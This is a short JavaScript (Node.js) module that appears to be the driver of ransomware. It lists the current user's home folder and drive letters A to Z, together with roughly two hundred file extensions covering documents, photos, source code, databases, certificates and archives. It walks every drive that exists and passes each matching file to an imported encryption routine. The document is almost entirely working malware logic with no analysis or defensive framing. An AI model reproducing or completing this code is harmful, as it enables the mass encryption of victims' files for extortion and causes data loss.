'use strict';
const os = require('os');
const fs = require('fs');
const Search = require('./Search');
const Encryption = require('./Encryption');

const virtualPartitions = ["C:\\Users\\" + os.userInfo().username,
                          "K:\\", "L:\\", "M:\\", "N:\\", "O:\\",
                          "D:\\", "A:\\", "B:\\", "F:\\", "Q:\\",
                          "G:\\", "H:\\", "R:\\", "S:\\", "J:\\",
                          "U:\\", "W:\\", "V:\\", "X:\\", "T:\\",
                          "Y:\\", "Z:\\", "E:\\", "P:\\", "I:\\"];

const ext = [".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls",
           ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".jpeg", ".gif", ".csv",
           ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm",
           ".xml", ".psd", ".pdf", ".dll", ".c", ".cs", ".vb", ".mp3", ".mp4", ".f3d",
           ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi",
           ".apk", ".lnk", ".iso", ".7z", ".ace", ".arj", ".bz2", ".cab", ".gzip",
           ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mpg", ".core",
           ".crproj", ".pdb", ".ico", ".pas", ".db", ".torrent", ".3dm", ".3g2",
           ".3gp", ".aaf", ".accdb", ".aep", ".aepx", ".aet", ".ai", ".aif", ".arw",
           ".as", ".as3", ".asf", ".asx", ".bay", ".cdr", ".cer", ".class", ".cr2",
           ".crt", ".crw", ".dbf", ".dcr", ".der", ".dng", ".docb", ".docm", ".dot",
           ".dotm", ".dotx", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla", ".flv",
           ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".java", ".kdc",
           ".m3u", ".m3u8", ".m4u", ".max", ".mdf", ".mef", ".mid", ".mpa", ".mrw",
           ".msg", ".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".orf",
           ".p12", ".p7b", ".p7c", ".pef", ".pem", ".pfx", ".plb", ".pmd", ".pot",
           ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".pptm",
           ".prel", ".prproj", ".ps", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".raw",
           ".rb", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sr2", ".srf", ".srw",
           ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma", ".wmv",
           ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xlsb",
           ".xlsm", ".xlt", ".xltm", ".xltx", ".xlw", ".xqx"];

module.exports.start = function () {

    for (var partition of virtualPartitions) {

        if (fs.existsSync(partition)) {

            Search.walk(partition, function (filePath) {

                if (endsWithAny(ext, filePath)) {

                    Encryption.fileEncryption(filePath);
                }
            });
        }
    }
}

function endsWithAny(suffixes, string) {

    return suffixes.some(function (suffix) {

        return string.endsWith(suffix);
    });
}